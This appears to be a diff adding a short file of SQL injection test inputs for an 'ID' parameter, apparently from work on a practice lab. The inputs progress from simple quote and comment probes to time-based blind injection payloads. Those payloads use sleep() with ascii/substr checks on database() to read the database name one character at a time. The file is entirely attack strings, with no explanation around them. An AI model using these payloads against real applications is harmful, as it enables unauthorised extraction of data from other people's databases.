@@ -1,0 +1,14 @@
+ID:1' and if(ascii(mid(database(),1,1))=115,1,sleep(5))))-- 
+ID:1'
+ID:1"
+ID:1'-- 
+ID:1'-- 
+ID:1')-- 
+ID:1'-- 
+ID:1' and 1-- 
+ID:1' and  if(ascii(mid(database(),1,1))=115,1,sleep(5))-- 
+ID:1' and  if(ascii(mid(database(),1,1))=115,1,sleep(5))-- 
+ID:1' and  if(ascii(substr(database(),1,1))=115,1,sleep(5))-- 
+ID:1' and  if(ascii(substr(database(),1,1))=115,1,sleep(5))-- 
+ID:1' and  if(ascii(substr(database(),1,1))=116,1,sleep(5))-- 
+ID:1' and  if(ascii(substr(database(),1,1))=115,1,sleep(5))-- 
